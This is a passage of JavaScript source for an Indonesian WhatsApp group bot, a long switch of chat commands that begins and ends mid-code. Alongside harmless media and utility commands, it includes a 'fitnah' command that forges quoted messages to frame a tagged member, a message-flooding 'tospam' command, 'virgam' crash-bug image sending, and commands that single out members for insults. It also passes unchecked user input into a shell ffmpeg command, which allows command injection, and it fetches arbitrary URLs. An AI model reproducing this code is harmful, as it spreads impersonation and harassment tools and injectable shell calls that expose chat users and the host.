					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
					break
					
case 'gaycek':
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
					break
					
case 'lesbicek':
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
					break
					
case 'gantengcek':
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
					break
					
case 'cantikcek':
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
					break
					
case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
					break
				
case 'hobby':
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dev })
					break
					case 'babi':
 if(!isGroup) return reply("Hanya bisa di group")
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bua = pushname[Math.floor(Math.random() * mge.length)]
              teks = `Yang Paling Babi Disini Adalah : @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
        if(!isGroup) return reply("Hanya bisa di group")
              membr = []
              const ngewe = groupMembers
              
              const beb = ngewe[Math.floor(Math.random() * ngewe.length)]
              
              teks = `Yang Paling Beban Disini Adalah : @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break


           
           
           
           
           
           
           
           
           
           
           
           
       case 'tovirgam':
       case 'jadivirgam':
        if (!isOwner ) return sendvn(gakmau)
     if (!isOwner) return sendSticker(gaboleh)
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							xdev.sendMessage(from, buffer, image, {quoted: dev, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
           
           
           
           case 'out':
           case 'leave':
				if (!isGroup) return 
				        if (!isOwner) return sendvn(gakmau)
				    if (!isOwner && autosticker) return sendSticker(gaboleh)
				xdev.groupLeave(from)
						break
						
						
						
						case 'reportbug':
						case 'bugreport':
						case 'laporbug':
						if(!q) return reply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						if(!q) return reply("Masukan laporan bug yang di alami")
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`, buff, image, { caption: `*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` })
							await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
							await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					    } else {
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`,text)
						    await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
						    await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					        }
					       break
						
						
						
						
						
						
						
						case 'tts':	
						try{
						if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (args.length < 1) return reply('Kode bahasanya mana kak?')
					if (args.length < 2) return reply('Textnya mana kak?')
					const gtts = require('./lib/gtts')(args[0])
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
						xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})   } catch (err){
						console.log(err)
            	reply("Aduh gagal, coba lgi dong ^_^")
   
            }
					limitAdd(sender, limit)
					break
						
						
				
						
           
           
           
           
           
           



           
           
           
           
           
          
           
           
					
					
		case 'tourl':
               if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
               owgi = await xdev.downloadMediaMessage(boij)
               res = await uploadFile1Day(owgi)
               reply(res)
               } else {
               reply('kirim/reply gambar/video')
}
               break
					
					
		
			 
					
					
					
case 'volume':
if (Number(args[0]) >= 11) return reply("Maksimal volume adalah 10")
if (!isQuotedAudio) return reply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await xdev.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
xdev.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ftroli})
fs.unlinkSync(rname)
}
)
break
					
					
                 
                 
                 
           
           case 'ocr': 
				    if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
						const yamampun = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await xdev.downloadAndSaveMediaMessage(yamampun)
						reply('wait')
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply('eor')
								fs.unlinkSync(media)
							})
					} else {
						reply(`kirim gambar bertulisan english dengan caption ${prefix + command}`)
					}
					break

           
           case 'clear':
               if (!isOwner) return sendSticker(gaboleh)
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)                
                break
           
           case 'delchat':
               if (!isOwner) return sendSticker(gaboleh)
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)
                setTimeout( () => {
                xdev.sendMessage(from, aw, text)
                },3000)
                break
           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Close time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break
				
				
case 'opentime':        
			if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
               if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Open time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
					reply(open)
				}, timer)
				break
				
				
				
case 'nuliskiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                reply(mess.wait)                
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkiri.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                    '-size','960x1280',
                    '-pointsize','22',
                    '-interline-spacing','2',
                    '-annotate','+140+153',
                    fixHeight,'./temp/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
           break
                
                case 'nuliskanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                reply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkanan.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                     '-size', '960x1280',
                    '-pointsize','23',
                    '-interline-spacing','2',
                    '-annotate','+128+129',
                    fixHeight, './temp/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
             break
            case 'foliokiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                reply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
                break
                
            case 'foliokanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
                reply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                    '-pointsize',
'55',
                    '-interline-spacing',
'2',
                    '-annotate',
'+130+400',
                    fixHeight,
'./temp/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
                break
                
                
                
                
                
                
                
                
                
                
                

       
            
          case 'getfp':
         case 'getpp':
				if (isGroup) { 
				if(q) return reply("Jangan di tag")
				 if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return reply("Reply Targetnya")
				reply(mess.wait)
			     kicknya = dev.message.extendedTextMessage.contextInfo.participant
			     try {
                 pic = await xdev.getProfilePicture(kicknya)
                 } catch {
                pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                onichan = await getBuffer(pic)
				xdev.sendMessage(from, onichan, image, {quoted: floc2})
                } else {
                reply(mess.wait)
                linkpp = await xdev.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, {caption: "Nih", quoted: dev })
               }     
               break
            
            
            
               
            case 'getbio':
            if(isGroup){
         if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return reply("Reply Targetnya")
	  reply(mess.wait)
	  var yy = dev.message.extendedTextMessage.contextInfo.participant
var p = await xdev.getStatus(`${yy}`, MessageType.text)
reply(p.status)
} else{
reply(mess.wait)
var a = await xdev.getStatus(from, MessageType.text)
reply(a.status)
}
break
           
           
           
           
           


           
           

           
           
case 'tospam':
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await xdev.downloadAndSaveMediaMessage(encmedian)
				ara = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  sendSticker(ara)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await xdev.downloadAndSaveMediaMessage(encmediat)
				ara = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
	delb = await xdev.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
           
           
           
           
           
           
           
           
           
           
           
    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \n ketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await xdev.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
            


    

				
				
    
     




case 'darkjokes':
reply(mess.wait)
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					xdev.sendMessage(from, hasil, image, {quoted: ftext, caption: '*GELAP BOS :V*'})
				break
    
    
    case 'on': 
             if (!isOwner) return sendSticker(gaboleh)
            offline = false
            fakestatus(' ANDA TELAH ONLINE')
            break       
    case 'statuson':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!isOwner) return sendSticker(gaboleh)
            if(!q) return reply ("Alasanya apa kak ?")
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            reply(`Anda telah offline dengan alasan ${q}`)
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
     



case 'google':
              if (!q) return reply('masukan teks')
              if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              ggs({ 'query': q }).then(results => {
              vars =``
              vars += `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
               xdev.sendMessage(from, lama, text, {quoted : dev })
               })
               break


					
					
					case 'setnamebot':
					case 'setbotname':
					if(!isOwner) return reply('Ga mau')
					reply(`Berhasil mengubah nama bot ke ${q}`)
					fake = `${q}`
					break
					
					case 'forwardtotal':
					case 'totalforward':
					if(forwarding === false) return reply("Aktifkan fitur forward")
					if(!isOwner) return reply('Ga mau')
					if(!q) return reply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
					reply(`Berhasil mengubah total forward ke ${q}`)
					totalForward = `${q}`
					break
					
					
					
					



			       
		     





                    
                


     





    case 'kontag':
        if(!q) return reply(`penggunaan ${prefix}kontak nomor| nama`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    
    case 'fitnah':
    try{
    if(!isGroup) return reply("Hanya bisa di group tod")
    if(!q) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
           // if (args.length < 2) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join(" ")
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            } catch (err){
            	reply(`Error ngab, penggunaan :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            }
            break
    
            
    case 'tomp3':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
    case 'fast':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':  
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
            case 'hode':
  if(!isQuotedAudio) return reply('Reply audionya')
            reply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
						fs.unlinkSync(ran)
					})
				break
            
            case 'ghost':
if(!isQuotedAudio) return reply('Reply audionya')
            reply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return reply('Error!')
					buffer453 = fs.readFileSync(ran)
					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
                    fs.unlinkSync(ran)
				    })
		            break


case 'nightcore':
if(!isQuotedAudio) return reply('Reply audionya')
reply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					   })
				       break



case 'tupai':
if(!isQuotedAudio) return reply('Reply audionya')
				reply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return reply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					})
				break





case 'imut':
if(!isQuotedAudio) return reply('Reply audionya')
